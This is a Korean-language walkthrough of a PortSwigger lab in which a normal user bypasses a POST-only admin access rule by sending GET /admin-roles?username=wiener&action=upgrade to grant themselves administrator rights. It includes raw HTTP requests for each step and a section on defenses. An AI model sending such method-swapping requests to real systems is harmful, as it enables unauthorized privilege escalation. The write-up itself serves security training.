# Lab: Method-based access control can be circumvented

## 개요

- **난이도**: Practitioner
- **주제**: Access Control — 플랫폼 설정 오류 / HTTP 메서드 기반 접근 제어 우회 / 수직적 권한 상승
- **링크**: https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

## 목표

관리자 패널의 권한 상승 기능(`/admin-roles`)이 `POST` 메서드에만 접근 제어가 걸려 있다. 일반 사용자 세션으로 `GET` 메서드 요청을 보내 스스로를 관리자로 승격시킨다.

- 관리자 계정: `administrator:admin` (구조 파악용)
- 일반 계정: `wiener:peter`

## 취약 지점 — 메서드 기반 접근 제어

```
[프론트엔드/플랫폼 규칙 (추정)]
  DENY: POST, /admin-roles     ← 관리자 그룹이 아니면 POST 차단

[놓친 부분]
  같은 경로에 대한 GET 요청은 규칙에 없음
  → 일반 사용자 세션으로 GET /admin-roles 요청 시 통과
```

```
[정상 로직 — 관리자 UI]
  POST /admin-roles
  username=carlos&action=upgrade
  → 관리자가 타 사용자 권한 상승

[우회]
  GET /admin-roles?username=wiener&action=upgrade
  → 일반 사용자가 자기 자신을 승격
```

## 접근 제어와 HTTP 메서드

```
HTTP 메서드는 "의도" 를 나타낼 뿐, 보안 경계가 아니다.
  GET     조회
  POST    생성/제출
  PUT     수정
  DELETE  삭제

일부 애플리케이션/프록시는 특정 메서드에만 규칙을 적용한다.
  예: POST /admin  만 차단, GET /admin 은 방치

[핵심]
  민감 기능은 "메서드" 가 아니라 "사용자 권한" 으로 보호해야 한다.
```

## 공격 단계

### 1단계 — 관리자로 구조 파악

`administrator:admin` 로 로그인하고 관리자 패널에서 `carlos` 를 승격시킨다.
해당 요청을 Burp Repeater 로 보낸다.

```
POST /admin-roles HTTP/1.1
Cookie: session=<administrator 세션>
Content-Type: application/x-www-form-urlencoded

username=carlos&action=upgrade
```

### 2단계 — 일반 사용자 세션으로 시도

`wiener:peter` 로 로그인해 일반 사용자 세션 쿠키를 얻고,
Repeater 의 요청 쿠키를 일반 사용자 세션으로 교체해 재전송한다.

```
POST /admin-roles HTTP/1.1
Cookie: session=<wiener 세션>

username=carlos&action=upgrade
```

응답: `Unauthorized` → POST 에 대해서는 접근 제어가 동작한다.

### 3단계 — 메서드 기반 규칙 확인

메서드만 `POSTX` 같은 비표준 값으로 바꿔본다.

```
POSTX /admin-roles HTTP/1.1
Cookie: session=<wiener 세션>

username=carlos&action=upgrade
```

응답이 `missing parameter` 로 바뀌면, 접근 제어가 메서드 비교로 동작하고
백엔드는 다른 경로로 도달했음을 알 수 있다.

### 4단계 — GET 으로 변경해 우회

Burp 의 `Change request method` 로 요청을 GET 으로 바꾸고,
파라미터를 쿼리스트링으로 옮긴다. 대상은 자기 자신(`wiener`)으로 한다.

```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Cookie: session=<wiener 세션>
```

관리자 권한이 부여되어 랩 해결. (이후 `/admin` 접근 가능)

## 메서드 우회 시 파라미터 이동

```
[POST 일 때]
  본문(body): username=wiener&action=upgrade
  Content-Type: application/x-www-form-urlencoded

[GET 으로 변경]
  쿼리스트링: /admin-roles?username=wiener&action=upgrade
  본문 없음

→ 서버가 GET 에서도 쿼리 파라미터를 동일하게 처리하면 그대로 동작한다.
```

## 방어

```
[근본 원인]
  접근 제어를 특정 HTTP 메서드에만 적용
  → 다른 메서드로 같은 기능에 도달 가능

[올바른 방어]
  1. 모든 HTTP 메서드에 동일한 접근 제어 적용
     - 경로 기반이라면 메서드 화이트리스트와 무관하게 인가
     - 민감 엔드포인트는 허용 메서드 외 전부 명시적 거부(405)
  2. 메서드가 아니라 "권한" 으로 인가
     - 서버 측에서 세션 사용자 역할을 검사 (deny by default)
  3. 기능별 허용 메서드를 명확히 정의
     - 상태 변경은 POST/PUT 등으로 제한하고 다른 메서드는 거부
     - GET 으로 상태 변경이 가능하지 않도록 설계 (부작용 없는 GET)
  4. 프론트엔드 규칙과 백엔드 라우팅을 일치시킴

[안티패턴]
  DENY: POST, /admin 를 설정하고 GET 을 방치
  메서드 검사만으로 보안을 구성
  상태 변경 기능을 GET 으로도 처리
```

## 핵심 정리

- `/admin-roles` 는 `POST` 에만 접근 제어가 걸려 있었고, 일반 사용자가 `GET` 으로 호출해 스스로를 승격시켰다.
- 파라미터를 쿼리스트링으로 옮기고 메서드만 바꾸면 동일 기능이 수행됐다.
- 접근 제어는 메서드가 아니라 권한으로 판단해야 하며, 모든 메서드에 일관되게 적용되어야 한다.
- 상태 변경 기능은 특정 메서드로 제한하고, GET 으로는 부작용이 없도록 설계해야 한다.

## 배운 점

- 010 이 URL(경로) 불일치를 이용한 우회였다면, 011 은 HTTP 메서드 불일치를 이용한 우회다.
- 메서드 기반 규칙(POST만 차단)은 같은 리소스에 대한 다른 메서드를 놓친다.
- 접근 제어 규칙을 세울 때는 "이 경로에 도달 가능한 모든 방법(메서드/인코딩/경로 변형)" 을 고려해야 한다.
